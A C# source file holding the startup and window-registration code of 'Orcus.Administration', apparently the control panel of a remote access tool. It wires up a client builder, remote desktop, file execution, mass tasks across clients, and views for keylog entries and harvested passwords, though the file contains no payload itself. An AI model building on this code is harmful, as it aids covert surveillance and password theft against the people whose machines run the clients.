using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Windows;
using Orcus.Administration.Core;
using Orcus.Administration.Core.CLA;
using Orcus.Administration.Core.CrowdControl;
using Orcus.Administration.Core.Logging;
using Orcus.Administration.Core.Plugins;
using Orcus.Administration.DataManagement;
using Orcus.Administration.Licensing;
using Orcus.Administration.ViewModels;
using Orcus.Administration.ViewModels.CommandViewModels.ClipboardManager;
using Orcus.Administration.ViewModels.CommandViewModels.DeviceManager;
using Orcus.Administration.ViewModels.CommandViewModels.FileExplorer;
using Orcus.Administration.ViewModels.CommandViewModels.Registry;
using Orcus.Administration.ViewModels.CommandViewModels.RemoteDesktop;
using Orcus.Administration.ViewModels.CommandViewModels.SystemRestore;
using Orcus.Administration.ViewModels.CommandViewModels.Taskmanager;
using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Administration.Views;
using Orcus.Administration.Views.CommandViewWindows;
using Orcus.Administration.Views.Dialogs;
using Orcus.Administration.Views.LanguageCreator;
using Orcus.Administration.Views.Licensing;
using Orcus.Shared.Commands.Keylogger;
using Orcus.Shared.Commands.Password;

#if !DEBUG
using Orcus.Administration.Exceptionless;
#endif

namespace Orcus.Administration
{
    /// <summary>
    ///     Interaction logic for App.xaml
    /// </summary>
    public partial class App
    {
        public static int ClientApiVersion { get; } = 2;

        protected override void OnStartup(StartupEventArgs e)
        {
            base.OnStartup(e);
#if !DEBUG
            new ExceptionHandler().Register();
#endif

            if (CommandLineArgs.Current.OpenLanguageCreator)
            {
                new LanguageCreatorWindow().Show();
                return;
            }

            if (CommandLineArgs.Current.OpenHardwareIdViewer)
            {
                MessageBox.Show(
                    "Your HWID is:\r\n" + HardwareIdGenerator.HardwareId +
                    "\r\nYou can copy this message with Ctrl+C", "Hardware ID", MessageBoxButton.OK,
                    MessageBoxImage.Information);
                Environment.Exit(0);
            }

            var windowServiceInterface = InitializeWindowServiceInterface();

            try
            {
                Settings.Load(CommandLineArgs.Current.SettingsFilePath ?? "settings.json");
            }
            catch (Exception)
            {
                if (
                    MessageBox.Show(
                        "An exception occurred when trying to load the settings file (settings.json). Do you want to recreate it and start the administration?",
                        "Load settings", MessageBoxButton.OKCancel, MessageBoxImage.Error) != MessageBoxResult.OK)
                    throw;

                var file = CommandLineArgs.Current.SettingsFilePath ?? "settings.json";
                File.Delete(file);
                Settings.Load(file);
            }

            //Really important, the exception dialog needs the resources so we remove them when new one exists
            //Resources now:
            //[...]
            //Resources/Themes/Accents/Crimson.xaml
            //Resources/Themes/Light.xaml
            //CurrentLanguage
            //CurrentTheme
            //CurrentAccent

            Current.Resources.MergedDictionaries.RemoveAt(Current.Resources.MergedDictionaries.Count - 4);
            Current.Resources.MergedDictionaries.RemoveAt(Current.Resources.MergedDictionaries.Count - 4);

            var licenseFile = new FileInfo(CommandLineArgs.Current.LicenseFilePath ?? "license.orcus");
            if (!licenseFile.Exists)
            {
                Current.ShutdownMode = ShutdownMode.OnExplicitShutdown;
                var licenseWindow = new RegisterOrcusWindow();
                if (licenseWindow.ShowDialog() != true)
                    Environment.Exit(0);
            }

            var license = OrcusActivator.Parse(File.ReadAllText(licenseFile.FullName));
            if (!license.IsValid)
            {
                MessageBox.Show("Invalid license.", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                Environment.Exit(0);
            }

            //From http://patorjk.com/software/taag Font: Avatar
            const string welcomeString = @" ____  ____  ____  _     ____ 
/  _ \/  __\/   _\/ \ /\/ ___\
| / \||  \/||  /  | | |||    \
| \_/||    /|  \_ | \_/|\___ |
\____/\_/\_\\____/\____/\____/";
            const string christmasString = @"   ,--.
  ()   \
   /    \                  _      _____ ____  ____ ___  _  ___  _      _      ____  ____ 
 _/______\_               / \__/|/  __//  __\/  __\\  \//  \  \//     / \__/|/  _ \/ ___\
(__________)              | |\/|||  \  |  \/||  \/| \  /    \  /_____ | |\/||| / \||    \
(/  @  @  \)              | |  |||  /_ |    /|    / / /     /  \\____\| |  ||| |-||\___ |
(`._,()._,')              \_/  \|\____\\_/\_\\_/\_\/_/     /__/\\     \_/  \|\_/ \|\____/
(  `-'`-'  )
 \        /
  \,,,,,,/";

            Logger.Log(LogLevel.Logo, DateTime.Now.Month == 12 && DateTime.Now.Day >= 24 && DateTime.Now.Day <= 27 ? christmasString : welcomeString);
            Logger.Log(LogLevel.Logo,
                $"\n<<<<<<< {(string) Current.Resources["Version"]}: {Assembly.GetExecutingAssembly().GetName().Version} || {(string) Current.Resources["Developer"]}: Sorzus (Orcus Technologies) >>>>>>>");
            PluginManager.Current.Initialize();
            CrowdControlPresets.Current.Load("shortcuts");

            if (PluginManager.Current.LoadedPlugins.Count > 1)
                Logger.Log(LogLevel.Info,
                    string.Format((string) Current.Resources["PluginsLoaded"],
                        PluginManager.Current.LoadedPlugins.Count));
            else if (PluginManager.Current.LoadedPlugins.Count == 1)
                Logger.Log(LogLevel.Info, (string) Current.Resources["PluginLoaded"]);

            new MainWindow().Show();
            windowServiceInterface.RegisterMainWindow();
            InitializeOtherStuff();
            Current.ShutdownMode = ShutdownMode.OnMainWindowClose;
        }

        private static WpfWindowServiceInterface InitializeWindowServiceInterface()
        {
            var windowServiceInterface = new WpfWindowServiceInterface();

            //Windows
            windowServiceInterface.RegisterWindow<ClientBuilderWindow, ClientBuilderViewModel>();
            windowServiceInterface.RegisterWindow<PropertyGridSettingsWindow, PropertyGridSettingsViewModel>();
            windowServiceInterface.RegisterWindow<InputTextWindow, InputTextViewModel>();
            windowServiceInterface.RegisterWindow<ConfigurationManagerWindow, ConfigurationManagerViewModel>();
            windowServiceInterface.RegisterWindow<InputMultilineTextWindow, InputMultilineTextViewModel>();
            windowServiceInterface.RegisterWindow<SettingsWindow, SettingsViewModel>();
            windowServiceInterface.RegisterWindow<ActivityMonitorWindow, ActivityMonitorViewModel>();
            windowServiceInterface.RegisterWindow<PluginsWindow, PluginsViewModel>();
            windowServiceInterface.RegisterWindow<DownloadWindow, DownloadViewModel>();
            windowServiceInterface.RegisterWindow<DataManagerWindow, DataManagerViewModel>();
            windowServiceInterface.RegisterWindow<ClientMapWindow, ClientMapViewModel>();
            windowServiceInterface.RegisterWindow<CrowdControlWindow, CrowdControlViewModel>();
            windowServiceInterface.RegisterWindow<CrowdControlManagePresetsWindow, CrowdControlManagePresetsViewModel>();
            windowServiceInterface.RegisterWindow<CrowdControlEventsWindow, CrowdControlEventsViewModel>();
            windowServiceInterface.RegisterWindow<AddConditionWindow, AddConditionViewModel>();
            windowServiceInterface.RegisterWindow<CrowdControlCreateTaskWindow, CrowdControlCreateTaskViewModel>();
            windowServiceInterface.RegisterWindow<StatisticsWindow, StatisticsViewModel>();
            windowServiceInterface.RegisterWindow<UpdateWindow, UpdateViewModel>();
            windowServiceInterface.RegisterWindow<ConfigureServerWindow, ConfigureServerViewModel>();
            windowServiceInterface.RegisterWindow<ConnectToServerWindow, ConnectToServerViewModel>();
            windowServiceInterface.RegisterWindow<ProxySettingsWindow, ProxySettingsViewModel>();
            windowServiceInterface.RegisterWindow<CommandWindow, CommandViewModel>();
            windowServiceInterface.RegisterWindow<DeviceManagerPropertiesWindow, DeviceViewModel>();
            windowServiceInterface.RegisterWindow<ComputerInformationWindow, ComputerInformationViewModel>();
            windowServiceInterface.RegisterWindow<PasswordsWindow, PasswordsViewModel>();
            windowServiceInterface
                .RegisterWindow<CrowdControlShortcutSettingsWindow, CrowdControlShortcutSettingsViewModel>();
            windowServiceInterface.RegisterWindow<ExceptionsWindow, ExceptionsViewModel>();
            windowServiceInterface.RegisterWindow<FileExplorerTransferManagerWindow, FileTransferManagerViewModel>();
            windowServiceInterface.RegisterWindow<FileExplorerFailedEntryDeletionsWindow, FailedEntryDeletionsViewModel>();
            windowServiceInterface.RegisterWindow<FileExplorerCreateShortcutWindow, CreateShortcutViewModel>();
            windowServiceInterface.RegisterWindow<FileExplorerPropertiesWindow, PropertiesViewModel>();
            windowServiceInterface.RegisterWindow<FileExplorerExecuteFileWindow, ExecuteFileViewModel>();
            windowServiceInterface.RegisterWindow<RegistryEditValueWindow, EditValueViewModel>();
            windowServiceInterface.RegisterWindow<RegistryCreateSubKeyWindow, CreateSubKeyViewModel>();
            windowServiceInterface.RegisterWindow<TaskmanagerProcessPropertiesWindow, ProcessPropertiesViewModel>();
            windowServiceInterface.RegisterWindow<CreateSystemRestorePointWindow, CreateSystemRestorePointViewModel>();
            windowServiceInterface.RegisterWindow<RemoteDesktopOptionsWindow, OptionsViewModel>();
            windowServiceInterface.RegisterWindow<CrowdControlExecutingClients, CrowdControlExecutingClientsViewModel>();
            windowServiceInterface.RegisterWindow<ClipboardManagerEditWindow, ClipboardManagerEditViewModel>();
            windowServiceInterface.RegisterWindow<FileExplorerArchiveOptionsWindow, ArchiveOptionsViewModel>();
            windowServiceInterface.RegisterWindow<FileExplorerDownloadFromUrlWindow, DownloadFileViewModel>();
            //Views
            windowServiceInterface.RegisterView<FileManagerKeyLogView, List<KeyLogEntry>>();
            windowServiceInterface.RegisterView<FileManagerPasswordsView, PasswordData>();

            WindowServiceInterface.Initialize(windowServiceInterface);

            return windowServiceInterface;
        }

        private static void InitializeOtherStuff()
        {
            PluginsWindow.Initialize();
        }

        protected override void OnExit(ExitEventArgs e)
        {
            base.OnExit(e);
            if (Settings.Current.IsLoaded)
                Settings.Current.Save();
        }
    }
}